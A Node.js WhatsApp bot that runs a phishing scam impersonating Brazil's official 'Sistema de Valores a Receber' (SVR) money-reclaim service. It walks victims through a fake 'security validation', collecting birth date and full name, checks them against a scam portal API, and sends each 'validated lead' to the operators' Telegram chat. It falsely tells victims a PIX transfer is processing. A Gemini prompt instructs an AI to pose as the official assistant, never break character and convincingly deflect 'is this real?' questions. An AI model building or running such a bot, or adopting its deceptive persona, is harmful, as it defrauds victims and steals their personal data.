const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const API_URL = process.env.API_URL || 'https://portalsvr.shardweb.app';
const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
const GEMINI_KEY = process.env.GEMINI_API_KEY || "";

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const systemPrompt = `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber). Seu objetivo ÚNICO é ajudar o usuário a completar a validação de segurança para receber o dinheiro dele. 
        Instruções:
        1. Seja profissional, educado e direto.
        2. Se o usuário perguntar algo fora do assunto (ex: 'quem é você?', 'como funciona?', 'isso é real?'), responda de forma convincente e diga que para prosseguir ele DEVE seguir as instruções de segurança e digitar o dado solicitado.
        3. Nunca saia do personagem.
        4. Use negrito em palavras chave.
        5. Mantenha as respostas curtas (máximo 3 frases).`;

        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${systemPrompt}\n\nUsuário disse: ${userMessage}\nO que você responde para trazê-lo de volta ao foco?` }] }]
        });
        return response.data.candidates[0].content.parts[0].text;
    } catch (e) {
        return "Para sua segurança, prossiga com a validação dos dados solicitados acima.";
    }
}

const botId = process.argv.find(arg => arg.startsWith('--id='))?.split('=')[1] || 'main';

const client = new Client({
    authStrategy: new LocalAuth({ clientId: `session-${botId}` }),
    puppeteer: {
        executablePath: (function() {
            const paths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable'];
            const found = paths.find(p => fs.existsSync(p));
            console.log(`🌐 NAVEGADOR: ${found || 'PADRÃO'}`);
            return found || null;
        })(),
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
        headless: 'new'
    }
});

async function notifyTelegram(text) {
    if (!TG_TOKEN || !CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text,
            parse_mode: 'HTML'
        });
    } catch (e) { console.error("❌ Erro Telegram:", e.message); }
}

client.on('qr', (qr) => {
    console.log('💠 QR CODE RECEBIDO!');
    qrcode.generate(qr, { small: true });
    notifyTelegram(`🖼️ <b>NOVO QR CODE (Slot: ${botId})</b>\n\nEscaneie para conectar o atendimento.`);
});

client.on('ready', () => {
    console.log(`✅ BOT ${botId} ONLINE!`);
    notifyTelegram(`🟢 <b>BOT ONLINE (Slot: ${botId})</b>\nO atendimento automático está ativo.`);
    fs.writeFileSync(`bot-status-${botId}.json`, JSON.stringify({ status: 'CONNECTED', adminName: 'Principal', lastUpdate: Date.now() }));
});

client.on('disconnected', () => {
    notifyTelegram(`⚠️ <b>BOT DESCONECTADO (Slot: ${botId})</b>`);
});

const chatSessions = new Map();

client.on('message_create', async (msg) => {
    const chatId = msg.from;
    const text = msg.body;

    // 1. GATILHO INICIAL OU INTERVENÇÃO HUMANA
    if (msg.fromMe) {
        // Só iniciamos o bot se a mensagem for o gatilho E não houver uma sessão ativa ou se a sessão for idle
        const currentSession = chatSessions.get(msg.to);
        if (text.includes('SOLICITAÇÃO DE RESGATE')) {
            if (currentSession && currentSession.mode === 'bot') {
                console.log(`⏳ Sessão já ativa para ${msg.to}. Ignorando duplicata.`);
                return;
            }

            const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/);
            const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
            
            console.log(`🚀 Iniciando atendimento para: ${msg.to}`);
            
            let expectedData = null;
            if (userId) {
                try {
                    const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
                    expectedData = res.data;
                } catch (e) { }
            }

            chatSessions.set(msg.to, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now() });
            
            setTimeout(async () => {
                await client.sendMessage(msg.to, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
            }, 2000);
        } else {
            // Se o atendente mandou qualquer outra mensagem, silenciamos o robô
            if (currentSession && currentSession.mode !== 'human') {
                console.log(`👤 ATENDENTE ASSUMIU: Silenciando robô para ${msg.to}`);
                chatSessions.set(msg.to, { mode: 'human' });
            }
        }
        return;
    }

    // 2. RESPOSTAS DO CLIENTE
    const session = chatSessions.get(chatId);
    if (!session || session.mode !== 'bot') return;

    console.log(`📩 Resposta de ${chatId}: ${text}`);
    const chat = await msg.getChat();
    await chat.sendStateTyping();

    if (session.step === 1) {
        const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
        const typedDate = text.trim();
        
        if (dateRegex.test(typedDate)) {
            if (session.expectedData?.birthDate && typedDate !== session.expectedData.birthDate.trim()) {
                await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com o portal.\n\nPor favor, digite a data **correta**.`);
                return;
            }
            chatSessions.set(chatId, { ...session, step: 2, birthDate: typedDate });
            await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
        } else {
            // IA ENTRA EM AÇÃO AQUI
            const aiReply = await askAI("validacao_data", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
        }
    } else if (session.step === 2) {
        const typedName = text.trim();
        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (session.expectedData?.fullName) {
                const portalName = session.expectedData.fullName.toLowerCase().trim();
                if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
                    return;
                }
            }

            await msg.reply(`📋 *VALIDAÇÃO CONCLUÍDA!*\n\nSeus dados estão **100% CORRETOS**.\n\n⌛ *STATUS:* Processando transferência PIX...\n\nAguarde um especialista neste chat.`);
            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
            chatSessions.delete(chatId);
        } else {
            // IA ENTRA EM AÇÃO AQUI
            const aiReply = await askAI("validacao_nome", text);
            await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite seu nome completo (Nome e Sobrenome).`);
        }
    }
});

client.initialize();
